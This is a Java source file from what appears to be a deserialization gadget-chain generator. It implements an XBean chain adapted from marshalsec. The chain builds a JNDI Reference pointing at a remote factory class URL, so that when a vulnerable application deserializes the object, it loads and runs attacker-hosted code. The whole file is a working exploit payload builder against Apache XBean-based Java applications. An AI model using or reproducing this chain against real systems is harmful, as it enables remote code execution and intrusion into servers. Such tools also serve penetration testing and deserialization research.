package org.ses.gadgetbuilder.chains1;

import org.apache.xbean.naming.context.ContextUtil;
import org.apache.xbean.naming.context.WritableContext;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.noparam.ToStringTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import javax.naming.Context;
import javax.naming.Reference;

/**
 * On new Java versions this gadget chain requires the JVM option: -Dcom.sun.jndi.ldap.object.trustURLCodebase=true
 *
 * https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/gadgets/XBean.java
 */
@Authors(Authors.MBECHLER)
@Dependencies({"org.apache.xbean.xbean-naming:4.5"})
@Impact(Impact.JNDI)
public class XBean extends GadgetChain<ToStringTrampoline> {
    public XBean(ToStringTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        int sep = command.lastIndexOf('/');
        String factoryURL = command.substring(0, sep).replace("rmi", "http").replace("jndi", "http");
        String factoryName = command.substring(sep + 1);
        System.out.println(factoryName);

        Context ctx = Reflections.createWithoutConstructor(WritableContext.class);
        Reference ref = new Reference("foo", factoryName, factoryURL);
        ContextUtil.ReadOnlyBinding binding = new ContextUtil.ReadOnlyBinding("foo", ref, ctx);

        return new TrampolineConnector(binding);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "javax.naming.Binding.toString()\n" +
                "org.apache.xbean.naming.context.ContextUtil.ReadOnlyBinding.getObject()\n" +
                "org.apache.xbean.naming.context.ContextUtil.resolve()\n" +
                "javx.naming.spi.NamingManager.getObjectInstance()";
    }





}
